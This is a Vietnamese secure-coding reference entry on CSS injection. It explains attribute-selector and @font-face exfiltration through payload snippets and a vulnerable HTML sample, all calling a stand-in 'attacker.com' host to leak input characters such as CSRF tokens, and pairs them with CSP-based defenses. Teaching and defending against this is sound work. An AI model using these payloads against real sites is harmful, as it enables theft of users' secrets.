# CSS Injection

> **CWE**: CWE-94 (Improper Control of Generation of Code) | **Phân loại**: Injection

## Kiến thức Nền tảng

CSS (Cascading Style Sheets) giống như lớp sơn và trang trí nội thất cho một ngôi nhà HTML. Nó giúp trang web có màu sắc, font chữ đẹp đẽ và bố cục gọn gàng. Ngoài ra, CSS còn có các bộ chọn thuộc tính (attribute selectors) thông minh để tìm kiếm các phần tử dựa trên một phần giá trị của chúng (như bắt đầu bằng `^=`, kết thúc bằng `$=` hoặc chứa chuỗi `*=`). Thông thường, trang web sử dụng các file CSS tĩnh đã được lập trình viên thiết kế sẵn và bảo vệ nghiêm ngặt bằng Chính sách bảo mật nội dung (CSP), giúp ngăn chặn việc tải hình ảnh hay font chữ từ những nguồn lạ.

```html
<!-- Secure HTML configuration with Content Security Policy (CSP) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Normal Operation - CSP style-src and img-src</title>
    <!-- 
      The HTTP-equiv Content-Security-Policy header restricts style sources 
      and prevents external background image requests, neutralizing CSS-based exfiltration.
    -->
    <meta http-equiv="Content-Security-Policy" 
          content="default-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self';">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <h1>Welcome to our secure application</h1>
    <!-- CSRF token stored in input element is safe from CSS selector exfiltration -->
    <input type="hidden" id="csrf-token" value="abc123xyz">
</body>
</html>
```

## Mô tả lỗ hổng

Lỗ hổng CSS Injection xảy ra khi ứng dụng web mở cửa cho phép người dùng tự ý đưa các đoạn mã trang trí CSS của riêng họ vào trang web mà không qua kiểm duyệt. Nhiều người nghĩ CSS chỉ làm thay đổi giao diện nên vô hại, nhưng thực tế kẻ tấn công có thể dùng nó làm công cụ gián điệp tinh vi. Bằng cách sử dụng các bộ chọn thuộc tính kết hợp với việc tải hình ảnh nền từ máy chủ của kẻ tấn công, CSS có thể rình mò từng ký tự trong các ô nhập liệu bí mật (như mã token bảo mật CSRF hay mật khẩu). Khi trình duyệt khớp đúng ký tự, nó sẽ gửi một yêu cầu tải ảnh về server của kẻ tấn công, vô tình tiết lộ thông tin nhạy cảm đó từng bước một. Lỗ hổng này nguy hiểm vì nó âm thầm lấy cắp dữ liệu của người dùng mà không cần chạy bất kỳ đoạn mã JavaScript nào.

## Cơ chế tấn công

Các kỹ thuật khai thác CSS Injection phổ biến bao gồm:

*   **CSS Keylogger (Attribute-based Exfiltration)**: Dùng bộ chọn thuộc tính CSS để kiểm tra giá trị của các thẻ `<input>`. Khi giá trị khớp với ký tự kiểm tra, trình duyệt sẽ tải một hình ảnh nền từ máy chủ của kẻ tấn công, gửi ký tự đó đi.
    *   *Payload*:
        ```css
        input[value^="a"] { background: url('http://attacker.com/leak?char=a'); }
        input[value^="b"] { background: url('http://attacker.com/leak?char=b'); }
        input[value^="c"] { background: url('http://attacker.com/leak?char=c'); }
        ```
        Bằng cách kết hợp nhiều bộ chọn khớp chuỗi con, kẻ tấn công có thể lấy cắp từng ký tự của CSRF token hoặc mật khẩu của người dùng khi ứng dụng tự động điền (autofill).
*   **@font-face Exfiltration (unicode-range)**: Khi thuộc tính `value` của input không có sẵn trong DOM (ví dụ người dùng đang gõ phím trực tiếp), kẻ tấn công khai báo font chữ tùy chỉnh trỏ tới máy chủ của họ và giới hạn phạm vi ký tự áp dụng (`unicode-range`). Khi ký tự tương ứng xuất hiện trên màn hình, trình duyệt nạp font chữ từ URL đó và vô tình tiết lộ ký tự vừa nhập.
    *   *Payload*:
        ```css
        @font-face {
          font-family: LeakFont;
          src: url('http://attacker.com/leak?char=a');
          unicode-range: U+0061; /* Hex for 'a' */
        }
        input { font-family: LeakFont, sans-serif; }
        ```
*   **CSS Timing Side-Channel**: Lợi dụng thời gian xử lý hiển thị đồ họa của trình duyệt. Kẻ tấn công thiết kế các bộ chọn CSS cực kỳ phức tạp (ví dụ lồng nhau hàng nghìn cấp hoặc sử dụng các bộ lọc SVG phức tạp) để làm chậm quá trình dựng trang (rendering) khi điều kiện so khớp đúng. Đo thời gian phản hồi hoặc hoạt động CPU của trình duyệt giúp kẻ tấn công xác định ký tự nào khớp mà không cần nạp tài nguyên từ bên ngoài.

## Biện pháp phòng thủ

- **Tóm tắt**: Tuyệt đối không cho phép người dùng chèn mã CSS trực tiếp, thực thi chính sách bảo mật nội dung (CSP) chặt chẽ và không lưu thông tin nhạy cảm trong thuộc tính hiển thị trực tiếp của DOM.
- **Các bước chi tiết**:
  - Triển khai Content Security Policy (CSP) chặt chẽ: giới hạn nguồn tải CSS (`style-src 'self'`) và cấm tải ảnh từ bên ngoài (`img-src 'self'`).
  - Sử dụng các thư viện vệ sinh CSS chuyên dụng nếu bắt buộc phải cho phép người dùng tải lên stylesheet.
  - Không đặt các giá trị nhạy cảm như CSRF token trong thuộc tính `value` của các thẻ nhập liệu hiển thị. Thay vào đó, hãy lưu chúng trong bộ nhớ JavaScript hoặc sử dụng cơ chế bảo mật Cookie Header.

## Code Example

```html
<!-- === VULNERABLE CODE === -->
<!-- The application directly injects user-controlled style content without validation -->
<html>
<head>
    <style>
        /* User inputted styles are rendered directly here */
        /* If attacker input is: input[value^="sec"] { background: url("http://attacker.com/leak?val=sec"); } */
        input[value^="sec"] { background: url("http://attacker.com/leak?val=sec"); }
    </style>
</head>
<body>
    <form>
        <input type="text" name="secret_key" value="secret123">
    </form>
</body>
</html>

<!-- === SECURE CODE === -->
<!-- Implements a strict Content Security Policy and prevents inline stylesheet injection -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- SECURE: CSP blocks inline styles and restricts background image loading to self -->
    <meta http-equiv="Content-Security-Policy" 
          content="default-src 'self'; style-src 'self'; img-src 'self';">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <form>
        <!-- The CSRF token is not vulnerable to CSS exfiltration under strict CSP -->
        <input type="hidden" name="csrf_token" value="safe_token_value">
    </form>
</body>
</html>
```

## Xem thêm

- [Cross-Site Scripting (XSS)](../xss/) — Lỗ hổng chèn mã độc HTML/JavaScript vào ứng dụng.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/research/exfiltrating-data-via-css-injection
- OWASP: https://owasp.org/www-community/attacks/CSS_Injection
- CWE: https://cwe.mitre.org/data/definitions/94.html

## Giải thích thuật ngữ

- **CSS Injection**: Chèn mã CSS độc hại vào trang web để thao túng giao diện hoặc lấy cắp thông tin.
- **Attribute Selector**: Bộ chọn thuộc tính trong CSS dùng để tìm các thẻ HTML dựa trên giá trị của chúng.
- **CSP (Content Security Policy)**: Chính sách bảo mật nội dung giúp ngăn chặn việc tải tài nguyên trái phép.
- **Exfiltration**: Hành vi rò rỉ hoặc lấy cắp dữ liệu ra bên ngoài hệ thống.
- **CSRF Token**: Chuỗi ký tự ngẫu nhiên dùng để chống giả mạo yêu cầu chéo trang.
